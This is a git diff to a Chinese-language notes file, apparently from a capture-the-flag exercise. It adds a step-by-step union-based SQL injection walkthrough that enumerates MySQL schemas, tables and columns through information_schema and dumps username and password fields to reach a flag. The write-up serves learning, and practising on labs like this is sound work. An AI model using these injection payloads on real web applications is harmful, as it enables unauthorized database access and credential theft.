@@ -1,5 +1,7 @@
 1.sql注入
 -
+
+**sqllite**：
 ```
 1' order by 2; 两列
 ```
@@ -18,6 +20,20 @@
 ```
 ![image](https://github.com/xhsy0314/Task/assets/84487619/67694d40-feb4-411a-8b83-9fc80e74ea8a)
 
+**sql**：
+<br>
+1.**查看注入类型**：输入1'报错You have an error in your SQL syntax;……，判断是字符注入
+<br>
+2.**确定列数**：' union select 1,2,3;#确定列数，2列时提示The used SELECT statements have a different number of columns，3列时提示success，说明列数为3列
+<br>
+3.**确定数据库名**：'union select 1,2,group_concat(schema_name) from information_schema.schemata;#，注意这里要用group_concat(schema_name)替代3，所以前面只写1,2即可，结果是： 'information_schema,mysql,performance_schema,test,geek' ，先测试一下geek
+<br>
+4.**确定数据表名**：' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek';#，结果是：'geekuser,l0ve1ysq1'
+<br>
+5.**确定表字段名**：' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' and table_name='l0ve1ysq1';#结果是：'id,username,password'
+<br>
+6.**确定字段内容**：' union select 1,2,group_concat(username,password) from geek.l0ve1ysq1;# 得到flag{aec2d854-1855-4168-be6f-3033aaa96c1a}
+<br>
 
 2.php
 -
